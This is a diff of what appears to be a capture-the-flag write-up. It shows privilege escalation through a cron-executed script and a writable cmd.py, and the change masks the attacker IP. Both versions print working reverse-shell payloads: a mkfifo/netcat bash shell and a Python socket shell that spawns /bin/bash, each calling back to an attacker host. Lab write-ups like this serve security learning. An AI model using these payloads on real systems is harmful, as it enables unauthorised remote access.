@@ -74,8 +74,7 @@ by looking at the cron jobs, we see that user mat will execute script from `/hom
 so i will put another rev shell into this file and then we need to wait for the cron 
 
 ```
-echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.14.91.59 7777 >/tmp/f" > cow.sh
-</bash -i 2>&1|nc 10.14.91.59 7777 >/tmp/f" > cow.sh
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.14.X.X 7777 >/tmp/f" > cow.sh
 ```
 
 it worked we have access as mat
@@ -95,7 +94,7 @@ we can modify the cmd.py, we also see that will_script uses the cmd.py so we can
 cmd.py: 
 
 ```
-import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.14.91.59",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.14.X.X",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
 ```
 
 the command to execute by looking at the sudo -l output
